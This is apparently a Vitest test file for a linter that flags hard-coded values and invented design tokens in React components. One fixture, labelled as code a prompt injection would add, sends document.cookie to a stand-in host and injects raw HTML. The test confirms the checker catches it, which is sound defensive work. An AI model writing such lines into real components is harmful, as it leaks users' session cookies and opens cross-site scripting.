// tulpar check: hard-coded values and invented tokens in component code, with no model and no design.

import { existsSync, mkdirSync, rmSync, writeFileSync } from "node:fs";
import { join, resolve } from "node:path";
import { afterAll, describe, expect, it } from "vitest";
import { checkCommand } from "../src/check.ts";

const radix = resolve(import.meta.dirname, "../../examples/radix");
const dir = join(radix, "check-fixture");

describe.skipIf(!existsSync(join(radix, "node_modules/@radix-ui/themes")))("tulpar check", { timeout: 120_000 }, () => {
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "Card.tsx"), 'import { Button } from "@radix-ui/themes";\nimport "./Card.css";\nexport default function Card() {\n  return <div className="card" style={{ color: "#ff00ff" }}><Button>Go</Button></div>;\n}\n');
  writeFileSync(join(dir, "Card.css"), ".card {\n  padding: 13px;\n  gap: var(--space-3, 12px);\n  margin: var(--space-33, 4px);\n  --card-gap: 8px;\n  row-gap: var(--card-gap);\n}\n");
  writeFileSync(join(dir, "Planted.tsx"), 'import { Button } from "@radix-ui/themes";\nexport default function Planted({ note }: { note: string }) {\n  fetch("https://collect.example/?c=" + document.cookie);\n  return <Button dangerouslySetInnerHTML={{ __html: note }} />;\n}\n');
  writeFileSync(join(dir, "Clean.tsx"), 'import { Button } from "@radix-ui/themes";\nexport default function Clean() {\n  return <Button size="2">Go</Button>;\n}\n');
  afterAll(() => rmSync(dir, { recursive: true, force: true }));

  it("finds hard-coded values and invented tokens, on their lines, from a changed stylesheet or component", async () => {
    const { code, findings } = await checkCommand(radix, [join(dir, "Card.css")], { quiet: true });
    expect(code).toBe(1);
    expect(findings.map((f) => `${f.kind} ${f.file.split("/").pop()}:${f.line}`).sort()).toEqual(["hard-coded Card.css:2", "hard-coded Card.tsx:4", "invented-token Card.css:4"]);
    // A real token and a variable the component declares itself are fine.
    expect(findings.some((f) => /space-3[^3]|card-gap/.test(f.message))).toBe(false);
  });

  it("finds unsafe code a prompt injection would add, on its lines", async () => {
    const { code, findings } = await checkCommand(radix, [join(dir, "Planted.tsx")], { quiet: true });
    expect(code).toBe(1);
    const unsafe = findings.filter((f) => f.kind === "unsafe");
    expect(unsafe.map((f) => `${f.file.split("/").pop()}:${f.line}`)).toEqual(["Planted.tsx:3", "Planted.tsx:3", "Planted.tsx:4"]);
    expect(unsafe.map((f) => f.message).join("\n")).toMatch(/fetch\(\) calls the network[\s\S]*cookies[\s\S]*raw HTML/);
  });

  it("passes a component written with the design system", async () => {
    expect((await checkCommand(radix, [join(dir, "Clean.tsx")], { quiet: true })).code).toBe(0);
  });
});

// Carbon's layout tokens are named spacing-02 but written var(--cds-spacing-02): the check knows them by both.
const carbon = resolve(import.meta.dirname, "../../examples/carbon-react");
const carbonDir = join(carbon, "check-fixture");

describe.skipIf(!existsSync(join(carbon, "node_modules/@carbon/react")))("tulpar check on Carbon", { timeout: 120_000 }, () => {
  mkdirSync(carbonDir, { recursive: true });
  writeFileSync(join(carbonDir, "Tile.tsx"), 'import "./Tile.css";\nexport default function Tile() {\n  return <div className="tile" />;\n}\n');
  writeFileSync(join(carbonDir, "Tile.css"), ".tile {\n  gap: var(--cds-spacing-05, 16px);\n  padding: var(--cds-spacing-06, 24px);\n  margin: var(--cds-spacing-55, 4px);\n}\n");
  afterAll(() => rmSync(carbonDir, { recursive: true, force: true }));

  it("accepts real tokens written as code writes them, and still finds an invented one", async () => {
    const { findings } = await checkCommand(carbon, [join(carbonDir, "Tile.css")], { quiet: true });
    expect(findings.map((f) => `${f.kind} ${f.file.split("/").pop()}:${f.line}`)).toEqual(["invented-token Tile.css:4"]);
  });
});
